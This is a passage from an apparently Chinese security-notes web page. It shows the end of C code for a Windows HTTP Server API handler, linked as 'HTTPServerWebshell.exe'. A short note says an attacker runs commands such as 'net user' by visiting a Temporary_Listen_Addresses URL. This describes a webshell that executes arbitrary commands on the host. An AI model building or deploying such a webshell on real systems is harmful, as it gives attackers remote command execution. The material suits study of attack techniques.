//&nbsp;This&nbsp;request&nbsp;does&nbsp;not&nbsp;have&nbsp;an&nbsp;entity&nbsp;body.<br />		//<br /><br />		result&nbsp;=&nbsp;HttpSendHttpResponse(<br />			hReqQueue,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;ReqQueueHandle<br />			pRequest-&gt;RequestId,&nbsp;//&nbsp;Request&nbsp;ID<br />			0,<br />			&amp;response,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;HTTP&nbsp;response<br />			NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved1<br />			&amp;bytesSent,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;bytes&nbsp;sent&nbsp;(optional)<br />			NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved2<br />			0,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved3<br />			NULL,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;LPOVERLAPPED<br />			NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pReserved4<br />		);<br />		if&nbsp;(result&nbsp;!=&nbsp;NO_ERROR)<br />		{<br />			wprintf(L&quot;HttpSendHttpResponse&nbsp;failed&nbsp;with&nbsp;%lu&nbsp;\n&quot;,<br />				result);<br />		}<br />	}<br /><br />Done:<br /><br />	if&nbsp;(pEntityBuffer)<br />	{<br />		FREE_MEM(pEntityBuffer);<br />	}<br /><br />	if&nbsp;(INVALID_HANDLE_VALUE&nbsp;!=&nbsp;hTempFile)<br />	{<br />		CloseHandle(hTempFile);<br />		DeleteFile(szTempName);<br />	}<br /><br />	return&nbsp;result;<br />}<br /></div></div><br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\551-HTTPServerWebshell.exe">Linked file: HTTPServerWebshell.exe </a></td></tr></table><br />代码实际上是一个http处理程序，这个代码有点问题，如果运行了powershell等程序，不能立即返回，就会处于无限等待的状态<br /><br />攻击者直接访问网页：<br /><a href="http://192.168.61.128/Temporary_Listen_Addresses/?net%20user">http://192.168.61.128/Temporary_Listen_Addresses/?net%20user</a><br />即可<br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>